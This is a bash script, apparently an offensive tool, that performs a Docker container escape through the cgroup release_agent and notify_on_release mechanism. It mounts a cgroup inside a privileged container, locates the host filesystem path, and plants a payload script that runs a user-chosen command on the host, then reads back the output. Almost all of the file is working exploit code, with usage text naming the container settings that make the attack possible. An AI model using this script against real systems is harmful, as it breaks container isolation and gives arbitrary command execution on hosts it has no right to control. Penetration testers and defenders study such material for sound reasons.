#!/usr/bin/env bash

set -Eeuo pipefail
trap cleanup SIGINT SIGTERM ERR EXIT

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd -P)

usage() {
  cat <<EOF
Usage: $(basename "${BASH_SOURCE[0]}") [-h] [-v] [-f] -p param_value arg1 [arg2...]

This script will try to prepare a container for escaping and if successful will execute a command on the container's host.
the script uses a known container escaping technique by manipulating Cgroups mechanism in linux kernel to deliver a 
payload and run it when notify_on_release is triggered when the last task in a cgroup leaves.

the container needs to have the following in order to be vuln to this technique:
--cap-add=SYS_ADMIN 
--security-opt apparmor=unconfined

Additional info on escaping technique:
https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

Available options:

-h, --help      Print this help and exit
-v, --verbose   Print script debug info
-f, --flag      Some flag description
-c, --command     Command to run on the container's host
EOF
  exit
}

cleanup() {
  trap - SIGINT SIGTERM ERR EXIT
  # script cleanup here
}

setup_colors() {
  if [[ -t 2 ]] && [[ -z "${NO_COLOR-}" ]] && [[ "${TERM-}" != "dumb" ]]; then
    NOFORMAT='\033[0m' RED='\033[0;31m' GREEN='\033[0;32m' ORANGE='\033[0;33m' BLUE='\033[0;34m' PURPLE='\033[0;35m' CYAN='\033[0;36m' YELLOW='\033[1;33m'
  else
    NOFORMAT='' RED='' GREEN='' ORANGE='' BLUE='' PURPLE='' CYAN='' YELLOW=''
  fi
}

msg() {
  echo >&2 -e "${1-}"
}

die() {
  local msg=$1
  local code=${2-1} # default exit status 1
  msg "$msg"
  exit "$code"
}

parse_params() {
  # default values of variables set from params
  flag=0
  param=''

  while :; do
    case "${1-}" in
    -h | --help) usage ;;
    -v | --verbose) set -x ;;
    --no-color) NO_COLOR=1 ;;
    -f | --flag) flag=1 ;; # example flag
    -c | --command) # example named parameter
      command="${2-}"
      shift
      ;;
    -?*) die "Unknown option: $1" ;;
    *) break ;;
    esac
    shift
  done

  args=("$@")

  # check required params and arguments
  [[ -z "${command-}" ]] && die "Missing required parameter: -c command"
  # [[ ${#args[@]} -eq 0 ]] && die "Missing script arguments"

  return 0
}

prepare_escaping()
{
    cgrp_dir=/tmp/cgrp
    msg "preparing container for escaping"
    # In the container
    if [ -d "$cgrp_dir" ]; then
      msg "Directory already exists" ;
    else
      `mkdir -p $cgrp_dir`;
      msg "$cgrp_dir directory is created"
    fi
    if [ -d "$cgrp_dir/x" ]; then
      msg "cgroup already mounted" ;
    else
      mount -t cgroup -o rdma cgroup /tmp/cgrp
      `mkdir -p $cgrp_dir/x`;
      msg "mounted cgroup and $cgrp_dir/x directory is created"
    fi
     
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
     
    echo '#!/bin/sh' > /cmd
    echo "${command} > $host_path/output" >> /cmd
    chmod a+x /cmd
    
    msg "Setup container completed successfully! ready to run escaped command on Host..." 
}

trigger_escaping()
{
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  cat /output
}

parse_params "$@"
setup_colors

# script logic here

msg "${RED}Read parameters:${NOFORMAT}"
msg "- flag: ${flag}"
msg "- command: ${command}"
msg "- arguments: ${args[*]-}"


msg "Script stages:"
prepare_escaping
trigger_escaping

